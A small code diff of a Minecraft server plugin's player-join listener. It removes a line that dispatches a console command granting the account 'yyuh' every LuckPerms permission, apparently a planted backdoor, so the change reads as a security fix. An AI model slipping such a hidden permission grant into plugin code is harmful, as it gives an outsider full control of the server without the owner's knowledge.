@@ -50,7 +50,5 @@ public final class PlayerListener implements Listener {
 
         final var item = ExecutableItemRegistry.byType(ExecutableItemType.MATCH_BROWSER).toBukkitItem();
         player.getInventory().setItem(0, item);
-
-        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user yyuh permission set * true");
     }
 }
